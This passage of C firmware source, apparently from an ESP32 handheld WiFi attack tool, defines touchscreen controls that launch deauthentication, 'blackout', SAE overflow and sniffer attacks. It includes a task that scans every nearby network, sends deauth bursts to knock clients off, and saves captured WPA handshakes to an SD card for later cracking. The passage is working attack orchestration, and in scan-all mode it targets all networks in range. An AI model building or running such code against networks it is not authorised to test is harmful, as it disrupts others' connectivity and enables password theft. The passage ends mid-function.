    deauth_rescan_done_flag = false;
}

static void deauth_quit_event_cb(lv_event_t *e)
{
    (void)e;
    // Stop rescan timer
    deauth_rescan_timer_stop();
    // Stop all attacks (deauth, evil twin, etc.)
    wifi_attacks_stop_all();
    deauth_stop_flag = true;
    deauth_paused = false;
    // Navigate back to menu
    nav_to_menu_flag = true;
}

static void blackout_yes_btn_cb(lv_event_t *e)
{
    (void)e;
    
    // Set blackout UI active flag
    blackout_ui_active = true;
    scan_done_ui_flag = false;  // Clear any pending scan done flag
    
    // Delete the warning page content
    if (function_page) {
        lv_obj_clean(function_page);
    }
    
    // Create log display page
    blackout_log_ta = lv_textarea_create(function_page);
    lv_obj_set_size(blackout_log_ta, lv_pct(100), LCD_V_RES - 30 - 50);
    lv_obj_align(blackout_log_ta, LV_ALIGN_TOP_MID, 0, 30);
    lv_textarea_set_text(blackout_log_ta, "Starting Blackout Attack...\n");
    lv_obj_set_style_bg_color(blackout_log_ta, lv_color_make(0, 0, 0), 0);  // Black background
    lv_obj_set_style_text_color(blackout_log_ta, COLOR_MATERIAL_BLUE, 0);  // Green text
    lv_obj_set_style_border_color(blackout_log_ta, COLOR_MATERIAL_BLUE, 0);  // Green border
    lv_obj_set_style_border_width(blackout_log_ta, 2, 0);
    lv_obj_clear_state(blackout_log_ta, LV_STATE_FOCUSED);  // Hide cursor
    
    // Create Stop button at bottom
    blackout_stop_btn = lv_btn_create(function_page);
    lv_obj_set_size(blackout_stop_btn, lv_pct(100), 45);
    lv_obj_align(blackout_stop_btn, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(blackout_stop_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black button
    lv_obj_set_style_bg_color(blackout_stop_btn, COLOR_DARK_BLUE, LV_STATE_PRESSED);  // Dark green when pressed
    lv_obj_set_style_border_color(blackout_stop_btn, COLOR_MATERIAL_BLUE, 0);  // Green border
    lv_obj_set_style_border_width(blackout_stop_btn, 3, 0);
    lv_obj_t *stop_lbl = lv_label_create(blackout_stop_btn);
    lv_label_set_text(stop_lbl, "Stop");
    lv_obj_set_style_text_color(stop_lbl, COLOR_MATERIAL_BLUE, 0);  // Green text
    lv_obj_center(stop_lbl);
    lv_obj_add_event_cb(blackout_stop_btn, blackout_stop_btn_cb, LV_EVENT_CLICKED, NULL);
    
    // Enable log capture
    blackout_enable_log_capture();
    
    // Start blackout attack
    wifi_attacks_start_blackout();
}

static void blackout_stop_btn_cb(lv_event_t *e)
{
    (void)e;
    // Stop blackout attack
    wifi_attacks_stop_all();
    blackout_disable_log_capture();
    blackout_log_ta = NULL;
    blackout_stop_btn = NULL;
    blackout_ui_active = false;  // Clear blackout UI active flag
    scan_done_ui_flag = false;  // Clear any pending scan done flag
    // Navigate back to menu
    nav_to_menu_flag = true;
}

static void snifferdog_yes_btn_cb(lv_event_t *e)
{
    (void)e;
    
    // Set snifferdog UI active flag
    snifferdog_ui_active = true;
    scan_done_ui_flag = false;  // Clear any pending scan done flag
    
    // Delete the warning page content
    if (function_page) {
        lv_obj_clean(function_page);
    }
    
    // Create log display page
    snifferdog_log_ta = lv_textarea_create(function_page);
    lv_obj_set_size(snifferdog_log_ta, lv_pct(100), LCD_V_RES - 30 - 50);
    lv_obj_align(snifferdog_log_ta, LV_ALIGN_TOP_MID, 0, 30);
    lv_textarea_set_text(snifferdog_log_ta, "Starting Snifferdog Attack...\n");
    lv_obj_set_style_bg_color(snifferdog_log_ta, lv_color_make(0, 0, 0), 0);  // Black background
    lv_obj_set_style_text_color(snifferdog_log_ta, COLOR_MATERIAL_BLUE, 0);  // Green text
    lv_obj_set_style_border_color(snifferdog_log_ta, COLOR_MATERIAL_BLUE, 0);  // Green border
    lv_obj_set_style_border_width(snifferdog_log_ta, 2, 0);
    lv_obj_clear_state(snifferdog_log_ta, LV_STATE_FOCUSED);  // Hide cursor
    
    // Create Stop button at bottom
    snifferdog_stop_btn = lv_btn_create(function_page);
    lv_obj_set_size(snifferdog_stop_btn, lv_pct(100), 45);
    lv_obj_align(snifferdog_stop_btn, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(snifferdog_stop_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black button
    lv_obj_set_style_bg_color(snifferdog_stop_btn, COLOR_DARK_BLUE, LV_STATE_PRESSED);  // Dark green when pressed
    lv_obj_set_style_border_color(snifferdog_stop_btn, COLOR_MATERIAL_BLUE, 0);  // Green border
    lv_obj_set_style_border_width(snifferdog_stop_btn, 3, 0);
    lv_obj_t *stop_lbl = lv_label_create(snifferdog_stop_btn);
    lv_label_set_text(stop_lbl, "Stop");
    lv_obj_set_style_text_color(stop_lbl, COLOR_MATERIAL_BLUE, 0);  // Green text
    lv_obj_center(stop_lbl);
    lv_obj_add_event_cb(snifferdog_stop_btn, snifferdog_stop_btn_cb, LV_EVENT_CLICKED, NULL);
    
    // Enable log capture
    snifferdog_enable_log_capture();
    
    // Start snifferdog attack (custom implementation)
    if (sniffer_dog_active) {
        ESP_LOGI(TAG, "Snifferdog already active");
        return;
    }
    
    ESP_LOGI(TAG, "Starting Snifferdog...");
    sniffer_dog_active = true;
    
    // Set promiscuous filter
    esp_wifi_set_promiscuous_filter(&sniffer_filter);
    
    // Enable promiscuous mode with our callback
    esp_wifi_set_promiscuous_rx_cb(sniffer_dog_promiscuous_callback);
    esp_wifi_set_promiscuous(true);
    
    // Initialize dual-band channel hopping
    sniffer_dog_channel_index = 0;
    sniffer_dog_current_channel = dual_band_channels[0];
    esp_wifi_set_channel(sniffer_dog_current_channel, WIFI_SECOND_CHAN_NONE);
    sniffer_dog_last_channel_hop = esp_timer_get_time() / 1000;
    
    // Create channel hopping task with PSRAM stack
    sniffer_dog_task_stack = (StackType_t *)heap_caps_malloc(4096 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
    if (sniffer_dog_task_stack != NULL) {
        sniffer_dog_task_handle = xTaskCreateStatic(sniffer_dog_task, "sniffer_dog", 4096, NULL, 
            5, sniffer_dog_task_stack, &sniffer_dog_task_buffer);
        if (sniffer_dog_task_handle == NULL) {
            ESP_LOGE(TAG, "Failed to create sniffer_dog task");
            heap_caps_free(sniffer_dog_task_stack);
            sniffer_dog_task_stack = NULL;
        } else {
            ESP_LOGI(TAG, "Snifferdog task created with PSRAM stack");
        }
    } else {
        ESP_LOGE(TAG, "Failed to allocate sniffer_dog task stack from PSRAM");
    }
    
    ESP_LOGI(TAG, "Snifferdog started - hunting for AP-STA pairs...");
}

static void snifferdog_stop_btn_cb(lv_event_t *e)
{
    (void)e;
    
    // Stop snifferdog attack
    if (sniffer_dog_active || sniffer_dog_task_handle != NULL) {
        ESP_LOGI(TAG, "Stopping Snifferdog...");
        sniffer_dog_active = false;
        
        // Wait for task to finish
        for (int i = 0; i < 20 && sniffer_dog_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        
        // Force delete if still running
        if (sniffer_dog_task_handle != NULL) {
            vTaskDelete(sniffer_dog_task_handle);
            sniffer_dog_task_handle = NULL;
            // Free PSRAM stack
            if (sniffer_dog_task_stack != NULL) {
                heap_caps_free(sniffer_dog_task_stack);
                sniffer_dog_task_stack = NULL;
            }
        }
        
        esp_wifi_set_promiscuous(false);
        sniffer_dog_channel_index = 0;
        sniffer_dog_current_channel = dual_band_channels[0];
        sniffer_dog_last_channel_hop = 0;
        
        ESP_LOGI(TAG, "Snifferdog stopped");
    }
    snifferdog_disable_log_capture();
    snifferdog_log_ta = NULL;
    snifferdog_stop_btn = NULL;
    snifferdog_ui_active = false;  // Clear snifferdog UI active flag
    scan_done_ui_flag = false;  // Clear any pending scan done flag
    // Navigate back to menu
    nav_to_menu_flag = true;
}

static void sniffer_yes_btn_cb(lv_event_t *e)
{
    (void)e;
    
    // Set sniffer UI active flag
    sniffer_ui_active = true;
    scan_done_ui_flag = false;  // Clear any pending scan done flag
    
    // Delete the warning page content
    if (function_page) {
        lv_obj_clean(function_page);
    }
    
    // Create log display page
    sniffer_log_ta = lv_textarea_create(function_page);
    lv_obj_set_size(sniffer_log_ta, lv_pct(100), LCD_V_RES - 30 - 50);
    lv_obj_align(sniffer_log_ta, LV_ALIGN_TOP_MID, 0, 30);
    lv_textarea_set_text(sniffer_log_ta, "Starting WiFi Sniffer...\n");
    lv_obj_set_style_bg_color(sniffer_log_ta, lv_color_make(0, 0, 0), 0);  // Black background
    lv_obj_set_style_text_color(sniffer_log_ta, COLOR_MATERIAL_BLUE, 0);  // Green text
    lv_obj_set_style_border_color(sniffer_log_ta, COLOR_MATERIAL_BLUE, 0);  // Green border
    lv_obj_set_style_border_width(sniffer_log_ta, 2, 0);
    lv_obj_clear_state(sniffer_log_ta, LV_STATE_FOCUSED);  // Hide cursor
    
    // Create Enough button at bottom
    sniffer_stop_btn = lv_btn_create(function_page);
    lv_obj_set_size(sniffer_stop_btn, lv_pct(100), 45);
    lv_obj_align(sniffer_stop_btn, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(sniffer_stop_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black button
    lv_obj_set_style_bg_color(sniffer_stop_btn, COLOR_DARK_BLUE, LV_STATE_PRESSED);  // Dark green when pressed
    lv_obj_set_style_border_color(sniffer_stop_btn, COLOR_MATERIAL_BLUE, 0);  // Green border
    lv_obj_set_style_border_width(sniffer_stop_btn, 3, 0);
    lv_obj_t *enough_lbl = lv_label_create(sniffer_stop_btn);
    lv_label_set_text(enough_lbl, "Enough");
    lv_obj_set_style_text_color(enough_lbl, COLOR_MATERIAL_BLUE, 0);  // Green text
    lv_obj_center(enough_lbl);
    lv_obj_add_event_cb(sniffer_stop_btn, sniffer_enough_btn_cb, LV_EVENT_CLICKED, NULL);
    
    // Enable log capture
    sniffer_enable_log_capture();
    
    // Start sniffer task (custom implementation using wifi_sniffer.h)
    if (sniffer_task_active) {
        ESP_LOGI(TAG, "Sniffer already active");
        return;
    }
    
    ESP_LOGI(TAG, "Starting WiFi Sniffer...");
    sniffer_task_active = true;
    
    // Create sniffer task with PSRAM stack
    sniffer_task_stack = (StackType_t *)heap_caps_malloc(4096 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
    if (sniffer_task_stack != NULL) {
        sniffer_task_handle = xTaskCreateStatic(sniffer_task, "sniffer", 4096, NULL, 
            5, sniffer_task_stack, &sniffer_task_buffer);
        if (sniffer_task_handle == NULL) {
            ESP_LOGE(TAG, "Failed to create sniffer task");
            heap_caps_free(sniffer_task_stack);
            sniffer_task_stack = NULL;
            sniffer_task_active = false;
        } else {
            ESP_LOGI(TAG, "Sniffer task created with PSRAM stack");
        }
    } else {
        ESP_LOGE(TAG, "Failed to allocate sniffer task stack from PSRAM");
        sniffer_task_active = false;
    }
}

static void sniffer_enough_btn_cb(lv_event_t *e)
{
    (void)e;
    
    // Stop sniffer task
    if (sniffer_task_active || sniffer_task_handle != NULL) {
        ESP_LOGI(TAG, "Stopping WiFi Sniffer...");
        sniffer_task_active = false;
        
        // Wait for task to finish
        for (int i = 0; i < 20 && sniffer_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        
        // Force delete if still running
        if (sniffer_task_handle != NULL) {
            vTaskDelete(sniffer_task_handle);
            sniffer_task_handle = NULL;
            // Free PSRAM stack
            if (sniffer_task_stack != NULL) {
                heap_caps_free(sniffer_task_stack);
                sniffer_task_stack = NULL;
            }
        }
        
        ESP_LOGI(TAG, "Sniffer stopped");
    }
    sniffer_disable_log_capture();
    sniffer_log_ta = NULL;
    sniffer_stop_btn = NULL;
    sniffer_ui_active = false;  // Clear sniffer UI active flag
    scan_done_ui_flag = false;  // Clear any pending scan done flag
    // Navigate back to menu
    nav_to_menu_flag = true;
}

static void sae_overflow_yes_btn_cb(lv_event_t *e)
{
    (void)e;
    
    // Check if a network is selected
    const wifi_ap_record_t *records = wifi_scanner_get_results_ptr();
    
    // Get selected network count and index
    int selected_count = wifi_scanner_get_selected_count();
    int selected_indices[1];
    int selected_index = -1;
    
    if (selected_count > 0) {
        wifi_scanner_get_selected(selected_indices, 1);
        selected_index = selected_indices[0];
    }
    
    // SAE Overflow requires exactly ONE selected network
    if (selected_count != 1) {
        // Show error message
        if (function_page) {
            lv_obj_clean(function_page);
        }
        
        lv_obj_t *error_label = lv_label_create(function_page);
        lv_label_set_text(error_label, "SAE Overflow requires\nexactly ONE network.\n\nPlease scan and select\none network.");
        lv_obj_set_style_text_align(error_label, LV_TEXT_ALIGN_CENTER, 0);
        lv_obj_set_style_text_color(error_label, COLOR_MATERIAL_RED, 0);
        lv_obj_set_style_text_font(error_label, &lv_font_montserrat_16, 0);
        lv_obj_center(error_label);
        
        // Back button
        lv_obj_t *back_btn = lv_btn_create(function_page);
        lv_obj_set_size(back_btn, lv_pct(90), LV_SIZE_CONTENT);
        lv_obj_align(back_btn, LV_ALIGN_BOTTOM_MID, 0, -15);
        lv_obj_set_style_bg_color(back_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);
        lv_obj_set_style_bg_color(back_btn, COLOR_DARK_BLUE, LV_STATE_PRESSED);
        lv_obj_set_style_border_color(back_btn, COLOR_MATERIAL_BLUE, 0);
        lv_obj_set_style_border_width(back_btn, 2, 0);
        lv_obj_t *back_lbl = lv_label_create(back_btn);
        lv_label_set_text(back_lbl, "BACK");
        lv_obj_set_style_text_color(back_lbl, COLOR_MATERIAL_BLUE, 0);
        lv_obj_center(back_lbl);
        lv_obj_add_event_cb(back_btn, back_to_menu_cb, LV_EVENT_CLICKED, NULL);
        
        return;
    }
    
    // Set SAE overflow UI active flag
    sae_overflow_ui_active = true;
    scan_done_ui_flag = false;
    
    // Delete the warning page content
    if (function_page) {
        lv_obj_clean(function_page);
    }
    
    // Get selected network info
    const wifi_ap_record_t *ap = &records[selected_index];
    char ssid[33];
    if (ap->ssid[0]) {
        snprintf(ssid, sizeof(ssid), "%s", (const char *)ap->ssid);
    } else {
        snprintf(ssid, sizeof(ssid), "%02X%02X%02X%02X%02X%02X",
                 ap->bssid[0], ap->bssid[1], ap->bssid[2],
                 ap->bssid[3], ap->bssid[4], ap->bssid[5]);
    }
    
    // Title centered at top - "SAE Overflow attack in progress"
    lv_obj_t *title_label = lv_label_create(function_page);
    lv_label_set_text(title_label, "SAE Overflow attack in progress");
    lv_obj_set_style_text_font(title_label, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(title_label, COLOR_MATERIAL_BLUE, 0);
    lv_obj_align(title_label, LV_ALIGN_TOP_MID, 0, 36);
    
    // Attacked network info
    lv_obj_t *network_info = lv_label_create(function_page);
    char info_text[160];
    const char *band = (ap->primary <= 14) ? "2.4GHz" : "5GHz";
    snprintf(info_text, sizeof(info_text), 
             "Attacked network:\n\n"
             "SSID: %s\n"
             "Channel: %d (%s)\n"
             "BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
             ssid, ap->primary, band,
             ap->bssid[0], ap->bssid[1], ap->bssid[2],
             ap->bssid[3], ap->bssid[4], ap->bssid[5]);
    lv_label_set_text(network_info, info_text);
    lv_obj_set_style_text_color(network_info, COLOR_MATERIAL_BLUE, 0);
    lv_obj_set_style_text_font(network_info, &lv_font_montserrat_14, 0);
    lv_obj_align(network_info, LV_ALIGN_TOP_MID, 0, 70);
    lv_obj_set_style_text_align(network_info, LV_TEXT_ALIGN_CENTER, 0);
    
    // Stop & Exit tile at bottom (red with X icon) - same as Deauth
    sae_overflow_stop_btn = lv_btn_create(function_page);
    lv_obj_set_size(sae_overflow_stop_btn, 120, 55);
    lv_obj_align(sae_overflow_stop_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
    lv_obj_set_style_bg_color(sae_overflow_stop_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(sae_overflow_stop_btn, lv_color_lighten(COLOR_MATERIAL_RED, 50), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(sae_overflow_stop_btn, 0, 0);
    lv_obj_set_style_radius(sae_overflow_stop_btn, 10, 0);
    lv_obj_set_style_shadow_width(sae_overflow_stop_btn, 6, 0);
    lv_obj_set_style_shadow_color(sae_overflow_stop_btn, lv_color_make(0, 0, 0), 0);
    lv_obj_set_style_shadow_opa(sae_overflow_stop_btn, LV_OPA_40, 0);
    lv_obj_set_flex_flow(sae_overflow_stop_btn, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(sae_overflow_stop_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    
    lv_obj_t *x_icon = lv_label_create(sae_overflow_stop_btn);
    lv_label_set_text(x_icon, LV_SYMBOL_CLOSE);
    lv_obj_set_style_text_font(x_icon, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(x_icon, lv_color_make(255, 255, 255), 0);
    
    lv_obj_t *stop_text = lv_label_create(sae_overflow_stop_btn);
    lv_label_set_text(stop_text, "Stop & Exit");
    lv_obj_set_style_text_font(stop_text, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(stop_text, lv_color_make(255, 255, 255), 0);
    
    lv_obj_add_event_cb(sae_overflow_stop_btn, sae_overflow_stop_btn_cb, LV_EVENT_CLICKED, NULL);
    
    // Save selected network as target
    wifi_scanner_save_target_bssids();
    
    // Start SAE overflow attack
    esp_err_t start_res = wifi_attacks_start_sae_overflow();
    if (start_res != ESP_OK) {
        // Show error on the network info label
        char err[128];
        snprintf(err, sizeof(err), 
                 "Attacked network:\n\n"
                 "SSID: %s\n\n"
                 "Start failed: %s",
                 ssid, esp_err_to_name(start_res));
        lv_label_set_text(network_info, err);
        lv_obj_set_style_text_color(network_info, COLOR_MATERIAL_RED, 0);
        return;
    }
    
    sae_overflow_log_ta = NULL;  // No longer using textarea
    
    show_touch_dot = false;
    if (touch_dot) {
        lv_obj_add_flag(touch_dot, LV_OBJ_FLAG_HIDDEN);
    }
}

static void sae_overflow_stop_btn_cb(lv_event_t *e)
{
    (void)e;
    // Stop SAE overflow attack
    wifi_attacks_stop_all();
    sae_overflow_disable_log_capture();
    sae_overflow_log_ta = NULL;
    sae_overflow_stop_btn = NULL;
    sae_overflow_ui_active = false;
    scan_done_ui_flag = false;
    // Navigate back to menu
    nav_to_menu_flag = true;
}

static bool check_handshake_file_exists(const char *ssid) {
    if (!ssid || strlen(ssid) == 0) {
        return false;
    }
    
    // Take SD/SPI mutex before any filesystem operations
    // SD card and display share the same SPI bus!
    if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(5000)) != pdTRUE) {
        ESP_LOGW(TAG, "Failed to take SD/SPI mutex in check_handshake_file_exists");
        return false;
    }
    
    bool found = false;
    
    // Check if /sdcard/lab/handshakes exists
    struct stat st;
    if (stat("/sdcard/lab/handshakes", &st) != 0) {
        if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);
        return false; // Directory doesn't exist
    }
    
    // Open directory and check for files starting with SSID
    DIR *dir = opendir("/sdcard/lab/handshakes");
    if (!dir) {
        if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);
        return false;
    }
    
    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (strncmp(entry->d_name, ssid, strlen(ssid)) == 0 && strstr(entry->d_name, ".pcap") != NULL) {
            found = true;
            break;
        }
    }
    
    closedir(dir);
    
    // Release SD/SPI mutex
    if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);
    
    return found;
}

static void handshake_cleanup(void) {
    ESP_LOGI(TAG, "Cleaning up handshake attack...");
    
    // Stop any running attack
    attack_handshake_stop();
    
    // Reset state
    handshake_attack_active = false;
    handshake_target_count = 0;
    handshake_current_index = 0;
    handshake_selected_mode = false;
    
    // NOTE: Stack is freed by the caller (stop button), not here
    // to avoid race condition when task is still running
}

static void attack_network_with_burst(const wifi_ap_record_t *ap) {
    ESP_LOGI(TAG, "Burst attacking '%s' (Ch %d, RSSI: %d dBm)", 
                ap->ssid, ap->primary, ap->rssi);
    
    // Start attack on this network
    attack_handshake_start(ap, ATTACK_HANDSHAKE_METHOD_BROADCAST);
    
    // Send bursts with waits - 3 bursts total
    for (int burst = 0; burst < 3 && handshake_attack_active && !g_operation_stop_requested; burst++) {
        // Wait 1 second, then send next burst (first burst already sent by start)
        if (burst > 0) {
            attack_handshake_send_deauth_burst();
        }
        
        // Wait 3 seconds for clients to reconnect after deauth
        for (int i = 0; i < 30 && handshake_attack_active && !g_operation_stop_requested; i++) {
            vTaskDelay(pdMS_TO_TICKS(100));
            
            // Check if handshake captured
            if (attack_handshake_is_complete()) {
                ESP_LOGI(TAG, "✓ Handshake captured for '%s' after burst #%d!", 
                           ap->ssid, burst + 1);
                
                // Wait 2s to capture any remaining frames
                vTaskDelay(pdMS_TO_TICKS(2000));
                attack_handshake_stop();
                return; // Success!
            }
        }
        
        ESP_LOGI(TAG, "Burst #%d complete, trying next...", burst + 1);
    }
    
    // No handshake captured after 3 bursts
    ESP_LOGI(TAG, "✗ No handshake for '%s' after 3 bursts", ap->ssid);
    attack_handshake_stop();
}

static void handshake_attack_task(void *pvParameters) {
    (void)pvParameters;
    
    ESP_LOGI(TAG, "Handshake attack task started.");
    ESP_LOGI(TAG, "Mode: %s", handshake_selected_mode ? "Selected networks only" : "Scan all networks");
    
    // CRITICAL: Wait before ANY SD card operations to avoid SPI bus conflict with LVGL display
    // The SD card and display share the same SPI bus. If we access SD immediately after task
    // creation (especially check_handshake_file_exists), it will crash with SPI assert.
    // Give LVGL time to finish any ongoing display updates.
    vTaskDelay(pdMS_TO_TICKS(500));
    
    int64_t last_scan_time = 0;
    const int64_t SCAN_INTERVAL_US = 5 * 60 * 1000000; // 5 minutes in microseconds
    
    while (handshake_attack_active && !g_operation_stop_requested) {
        // In scan-all mode, perform periodic scans
        if (!handshake_selected_mode) {
            int64_t current_time = esp_timer_get_time();
            if (current_time - last_scan_time >= SCAN_INTERVAL_US || handshake_target_count == 0) {
                ESP_LOGI(TAG, "Performing scan for networks...");
                
                // Start scan using wifi_scanner
                esp_err_t scan_result = wifi_scanner_start_scan();
                if (scan_result != ESP_OK) {
                    ESP_LOGI(TAG, "Failed to start scan: %s", esp_err_to_name(scan_result));
                    vTaskDelay(pdMS_TO_TICKS(5000));
                    continue;
                }
                
                // Wait for scan to complete
                ESP_LOGI(TAG, "Waiting for scan to complete...");
                int timeout = 0;
                while (timeout < 200 && handshake_attack_active && !g_operation_stop_requested) {
                    uint16_t count = wifi_scanner_get_count();
                    if (count > 0) {
                        // Scan completed
                        break;
                    }
                    vTaskDelay(pdMS_TO_TICKS(100));
                    timeout++;
                }
                
                if (g_operation_stop_requested) {
                    ESP_LOGI(TAG, "Stop requested during scan, terminating...");
                    break;
                }
                
                // Get scan results
                uint16_t count = wifi_scanner_get_count();
                if (count == 0) {
                    ESP_LOGI(TAG, "Scan failed or no results, retrying in 5 seconds...");
                    vTaskDelay(pdMS_TO_TICKS(5000));
                    continue;
                }
                
                // Copy scan results to handshake targets
                handshake_target_count = (count < MAX_AP_CNT) ? count : MAX_AP_CNT;
                
                // Get results from scanner
                wifi_ap_record_t temp_results[MAX_AP_CNT];
                int got = wifi_scanner_get_results(temp_results, handshake_target_count);
                if (got > 0) {
                    memcpy(handshake_targets, temp_results, got * sizeof(wifi_ap_record_t));
                    handshake_target_count = got;
                    handshake_current_index = 0;
                    
                    ESP_LOGI(TAG, "Found %d networks to attack", handshake_target_count);
                    last_scan_time = current_time;
                } else {
                    ESP_LOGI(TAG, "Failed to get scan results, retrying...");
                    vTaskDelay(pdMS_TO_TICKS(5000));
                    continue;
                }
            }
        }
        
        // Attack all target networks
        ESP_LOGI(TAG, "");
        if (handshake_selected_mode) {
            ESP_LOGI(TAG, "===== Attacking Selected Networks =====");
        } else {
            ESP_LOGI(TAG, "===== PHASE 2: Attack All Networks =====");
        }
        ESP_LOGI(TAG, "Attacking %d networks...", handshake_target_count);
        
        int attacked_count = 0;
        int captured_count = 0;
        
        for (int i = 0; i < handshake_target_count && handshake_attack_active && !g_operation_stop_requested; i++) {
            wifi_ap_record_t *ap = &handshake_targets[i];
            
            // Skip if already captured
            if (handshake_captured[i]) {
                captured_count++;
                continue;
            }
            
            // Check if file already exists (skip for empty/hidden SSIDs)
            if (ap->ssid[0] != '\0' && check_handshake_file_exists((const char*)ap->ssid)) {
                ESP_LOGI(TAG, "[%d/%d] Skipping '%s' - PCAP already exists", 
                           i + 1, handshake_target_count, (const char*)ap->ssid);
                handshake_captured[i] = true;
                captured_count++;
                continue;
            }
            
            attacked_count++;
            ESP_LOGI(TAG, "");
            ESP_LOGI(TAG, ">>> [%d/%d] Attacking '%s' (Ch %d, RSSI: %d dBm) <<<", 
                       i + 1, handshake_target_count, (const char*)ap->ssid, ap->primary, ap->rssi);
            
            // Attack with burst strategy
            attack_network_with_burst(ap);
            
            // Check if captured
            if (attack_handshake_is_complete()) {
                handshake_captured[i] = true;
                captured_count++;
                ESP_LOGI(TAG, "✓✓✓ Handshake #%d captured! ✓✓✓", captured_count);
            }
            
            // Delay before next network
            if (i < handshake_target_count - 1) {
                ESP_LOGI(TAG, "Cooling down 2s before next network...");
                vTaskDelay(pdMS_TO_TICKS(2000));
            }
        }
        
        ESP_LOGI(TAG, "");
        ESP_LOGI(TAG, "===== Attack Cycle Complete =====");
        ESP_LOGI(TAG, "Total networks: %d", handshake_target_count);
        ESP_LOGI(TAG, "Networks attacked this cycle: %d", attacked_count);
        ESP_LOGI(TAG, "Handshakes captured so far: %d", captured_count);
        
        // Check if all selected networks captured (for selected mode)
        if (handshake_selected_mode) {
            bool all_done = true;
            int remaining = 0;
            for (int i = 0; i < handshake_target_count; i++) {
                if (!handshake_captured[i]) {
                    all_done = false;
                    remaining++;
                }
            }
            
            if (all_done) {
                ESP_LOGI(TAG, "✓✓✓ All selected networks captured! Attack complete. ✓✓✓");
                break;
            }
            
            // Continue looping until all captured
            ESP_LOGI(TAG, "Selected mode: %d networks still need handshakes, repeating attack cycle...", remaining);
            vTaskDelay(pdMS_TO_TICKS(3000)); // Small delay before next loop
        } else {
            // In scan-all mode, done after one cycle (no periodic scan in GUI mode)
            ESP_LOGI(TAG, "Scan-all mode: Attack cycle complete.");
            break;
        }
    }
    
    // Cleanup
    ESP_LOGI(TAG, "Handshake attack task finished.");
    handshake_cleanup();
    
    // NOTE: Do NOT set handshake_attack_task_handle to NULL here!
    // The stop button will do that after vTaskDelete completes.
    // Setting it to NULL here creates a race condition where the stop button
    // might try to free the stack while we're still using it.
    
    // Delete self - must be last line
    vTaskDelete(NULL);
}

static void handshake_yes_btn_cb(lv_event_t *e)
{
    (void)e;
    
    // Check if handshake attack is already running
    if (handshake_attack_active || handshake_attack_task_handle != NULL) {
        ESP_LOGW(TAG, "Handshake attack already running");
        return;
    }
    
    // Reset stop flag
    g_operation_stop_requested = false;
    
    // Initialize state
    handshake_target_count = 0;
    handshake_current_index = 0;
    memset(handshake_targets, 0, sizeof(handshake_targets));
    memset(handshake_captured, 0, sizeof(handshake_captured));
    
    // Set handshake UI active flag
    handshake_ui_active = true;
    scan_done_ui_flag = false;
    
    // Delete the warning page content
    if (function_page) {
        lv_obj_clean(function_page);
    }
    
    // Create log display page
    handshake_log_ta = lv_textarea_create(function_page);
    lv_obj_set_size(handshake_log_ta, lv_pct(100), LCD_V_RES - 30 - 50);
    lv_obj_align(handshake_log_ta, LV_ALIGN_TOP_MID, 0, 30);
    lv_textarea_set_text(handshake_log_ta, "Starting WPA Handshake Capture...\n");
    lv_obj_set_style_bg_color(handshake_log_ta, lv_color_make(0, 0, 0), 0);
    lv_obj_set_style_text_color(handshake_log_ta, COLOR_MATERIAL_BLUE, 0);
    lv_obj_set_style_border_color(handshake_log_ta, COLOR_MATERIAL_BLUE, 0);
    lv_obj_set_style_border_width(handshake_log_ta, 2, 0);
    lv_obj_clear_state(handshake_log_ta, LV_STATE_FOCUSED);
    
    // Create Stop button at bottom
    handshake_stop_btn = lv_btn_create(function_page);
    lv_obj_set_size(handshake_stop_btn, lv_pct(100), 45);
    lv_obj_align(handshake_stop_btn, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(handshake_stop_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(handshake_stop_btn, COLOR_DARK_BLUE, LV_STATE_PRESSED);
    lv_obj_set_style_border_color(handshake_stop_btn, COLOR_MATERIAL_BLUE, 0);
    lv_obj_set_style_border_width(handshake_stop_btn, 3, 0);
    lv_obj_t *stop_lbl = lv_label_create(handshake_stop_btn);
    lv_label_set_text(stop_lbl, "STOP");
    lv_obj_set_style_text_color(stop_lbl, COLOR_MATERIAL_BLUE, 0);
    lv_obj_center(stop_lbl);
    lv_obj_add_event_cb(handshake_stop_btn, handshake_stop_btn_cb, LV_EVENT_CLICKED, NULL);
    
    // Enable log capture
    handshake_enable_log_capture();
    
    // Check if networks were selected
    if (g_shared_selected_count > 0) {
        // Selected networks mode
        handshake_selected_mode = true;
        handshake_target_count = g_shared_selected_count;
        
        char header[160];
        snprintf(header, sizeof(header), "Selected Networks Mode\nTargets: %d network(s)\n", g_shared_selected_count);
        lv_textarea_add_text(handshake_log_ta, header);
        
        // Copy selected networks to handshake targets
        for (int i = 0; i < g_shared_selected_count; i++) {
            int idx = g_shared_selected_indices[i];
            memcpy(&handshake_targets[i], &g_shared_scan_results[idx], sizeof(wifi_ap_record_t));
        }
    } else {
        // Scan-all mode
        handshake_selected_mode = false;
        
        lv_textarea_add_text(handshake_log_ta, "Scan All Mode\nNo networks selected - will scan and attack all\n");
        
